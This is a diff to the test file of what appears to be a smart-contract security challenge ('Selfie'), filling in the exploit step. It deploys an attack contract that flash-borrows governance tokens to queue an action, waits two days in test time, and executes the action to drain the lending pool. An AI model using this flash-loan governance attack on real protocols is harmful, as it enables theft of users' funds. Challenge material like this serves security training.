@@ -7,6 +7,8 @@ const SimpleGovernance = contract.fromArtifact('SimpleGovernance');
 
 const { expect } = require('chai');
 
+const AttackContract = contract.fromArtifact('AttackSelfie');
+
 describe('[Challenge] Selfie', function () {
 
     const [deployer, attacker, ...otherAccounts] = accounts;
@@ -34,15 +36,38 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+
+        /**
+         * The issue is that the borrowed tokens are used to propose an action.
+         * The borrowed tokens are large enough to pass the governance.
+         */
+
+        // deploy
+        this.attackContract = await AttackContract.new(this.governance.address, this.pool.address, this.token.address, { from: attacker });
+        
+        // attack
+        await this.attackContract.loan({ from: attacker })
+
+        expect(
+            await this.attackContract.getActionId()
+        ).to.be.bignumber.equal("1");
+
+        // wait for two days
+        await time.increase(time.duration.days(2));
+
+        // now drain through governance
+        await this.governance.executeAction("1");
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
+        
         expect(
             await this.token.balanceOf(attacker)
         ).to.be.bignumber.equal(TOKENS_IN_POOL);        
         expect(
             await this.token.balanceOf(this.pool.address)
         ).to.be.bignumber.equal('0');
+        
     });
 });
